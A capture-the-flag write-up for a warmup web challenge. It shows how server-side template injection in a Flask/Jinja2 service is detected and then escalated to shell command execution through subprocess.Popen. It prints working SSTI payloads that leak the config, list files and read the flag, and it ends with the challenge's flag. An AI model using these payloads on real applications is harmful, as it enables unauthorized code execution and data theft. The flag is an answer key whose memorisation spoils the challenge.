# Challenge Name: Templates

## Description

**Category:** Warmup

> Just a simple service made using Server Side Rendering.

**Challenge URL:** `http://chall.0xfun.org:24809/`

**Flag format:** `0xfun{...}`

---

## Writeup

### Step 1: Detecting SSTI

Send a test payload in the `name` parameter:

```
name={{ 7*7 }}
```

The response shows `49`, confirming **Server-Side Template Injection (SSTI)**.

### Step 2: Confirming Jinja2 and Enumerating Classes

- `name={{ config }}` leaks the Flask config.
- `name={{ ''.__class__.__mro__[1].__subclasses__() }}` lists subclasses. Look for `subprocess.Popen`.

### Step 3: RCE via Popen

Use the Popen class to run shell commands:

- List directory:

```
name={{ ''.__class__.__mro__[1].__subclasses__()[-1]('ls -la', shell=True, stdout=-1).communicate() }}
```

- Read flag:

```
name={{ ''.__class__.__mro__[1].__subclasses__()[-1]('cat flag.txt', shell=True, stdout=-1).communicate() }}
```

The response body contains the command output.

### Step 4: Extracting the Flag

Decode the response and copy the flag from the command output.

---

## Resources

No local files — this is a remote web challenge.

---

## Flag

```
0xfun{Server_Side_Template_Injection_Awesome}
```
